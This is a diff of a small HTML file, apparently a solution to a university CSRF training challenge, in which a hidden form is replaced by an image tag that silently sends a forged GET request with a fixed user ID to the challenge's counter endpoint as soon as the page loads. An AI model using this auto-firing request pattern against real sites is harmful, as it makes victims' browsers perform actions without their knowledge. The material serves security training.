@@ -1,10 +1,13 @@
-<!-- csrf-exploit.html -->
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Challenge</title>
+</head>
 <body>
-  <form action="https://snickerboa.it.liu.se/user/csrfchallengeone/plusplus" method="get">
-    <input type="hidden" name="userid" value="8e23a76f34fbf4c17fc122c191bcd99aa4cc178c">
-    <!-- Add other parameters as needed -->
-    <input type="submit" value="Increment CSRF Counter">
-  </form>
+    <h1>CSRF Challenge</h1>
+    <p>Your CSRF counter will be incremented by loading this page:</p>
+    <img src="https://snickerboa.it.liu.se/user/csrfchallengeone/plusplus?userid=8e23a76f34fbf4c17fc122c191bcd99aa4cc178c" alt="CSRF Image">
 </body>
 </html>
